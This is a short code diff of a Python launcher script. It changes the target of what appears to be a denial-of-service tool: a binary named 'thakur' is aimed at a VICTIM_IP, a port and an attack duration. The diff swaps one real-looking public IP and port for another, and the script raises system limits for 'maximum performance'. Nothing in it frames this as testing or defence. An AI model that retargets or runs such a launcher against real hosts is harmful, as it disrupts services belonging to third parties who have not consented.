@@ -4,9 +4,9 @@ import subprocess
 import sys
 
 BINARY = "./thakur"
-VICTIM_IP = "147.75.202.61"
-VICTIM_PORT = "53"
-DURATION = "200"
+VICTIM_IP = "20.204.88.77"
+VICTIM_PORT = "10907"
+DURATION = "180"
 
 def setup_limits():
     print("[+] Setting system limits for maximum performance...")
